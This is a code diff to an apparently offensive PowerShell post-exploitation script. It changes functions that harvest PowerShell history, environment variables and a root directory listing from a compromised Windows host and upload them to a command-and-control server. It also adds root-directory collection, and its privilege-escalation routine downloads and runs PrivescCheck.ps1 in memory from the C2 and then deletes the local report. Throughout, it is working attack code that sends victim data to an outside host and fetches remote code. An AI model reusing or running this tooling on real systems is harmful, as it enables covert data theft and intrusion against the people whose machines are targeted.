@@ -104,7 +104,7 @@ function Invoke-Collection {
         try {
             $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue | Out-String
             if ($psHist) {
-                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
+                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_ConsoleHost_history.txt" | Out-Null
             }
         } catch { }
     }
@@ -131,9 +131,19 @@ function Invoke-Collection {
     # ----------------------------------------
     try {
         $envVar = ls env: | Out-String
-        Invoke-FileUpload -C2 $C2 -InputString $envVar -FileName "Env_vars_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
+        Invoke-FileUpload -C2 $C2 -InputString $envVar -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_Env_vars.txt" | Out-Null
     } catch {
         Write-Host "Error while enumerating environment: $_" -ForegroundColor Yellow
+    }
+
+    # ----------------------------------------
+    # Collect Root
+    # ----------------------------------------
+    try {
+        $root = ls / | Out-String
+        Invoke-FileUpload -C2 $C2 -InputString $root -FileName "$($env:COMPUTERNAME)_Root.txt" | Out-Null
+    } catch {
+        Write-Host "Error while enumerating root: $_" -ForegroundColor Yellow
     }
 }
 
@@ -177,22 +187,22 @@ function Invoke-PrivEsc {
     # Restore console output
     [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
-    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "winpeas_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeas.txt" | Out-Null
 
     # ----------------------------------------
     # Run PrivescCheck.ps1 in-memory → POST separately
     # ----------------------------------------
     $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
     Invoke-Expression $privCheck
-    $privCheckHtml = Join-Path $tmp "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).html"
+    $privCheckHtml = Join-Path $tmp "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck"
     $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
-    Invoke-FileUpload -C2 $C2 -FilePath $privCheckHtml | Out-Null
+    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck.txt" | Out-Null
+    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
 
     # ----------------------------------------
     # Cleanup
     # ----------------------------------------
-    Remove-Item $privCheckHtml -Force
+    Remove-Item "$privCheckHtml.html" -Force
 }
 
 
@@ -222,7 +232,14 @@ function Invoke-FileUpload {
                 Write-Error "File not found: $FilePath"
                 return
             }
+
             $FileName = [System.IO.Path]::GetFileName($FilePath)
+
+            # Get file owner (domain\user)
+            $Owner = (Get-Acl -Path $FilePath).Owner -replace '[\\]', '_'
+
+            # Prepend values to filename: Host_Owner_Filename.ext
+            $FileName = "$($env:COMPUTERNAME)_$($Owner)_$($FileName)"
             $FileContent = Get-Content -Raw -Path $FilePath
         }
         else {
@@ -239,7 +256,12 @@ function Invoke-FileUpload {
         # Send request
         Invoke-WebRequest -Uri $Url -Method Post -Body $Body -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing
 
-        Write-Host "[*] Uploaded $FileName to $Url"
+        if ($FilePath -and (Test-Path $FilePath)) {
+            Write-Host "[*] Uploaded $FilePath as $FileName to $Url"
+        }
+        else {
+            Write-Host "[*] Uploaded $FileName to $Url"
+        }
     }
     catch {
         Write-Error "Upload failed: $_"
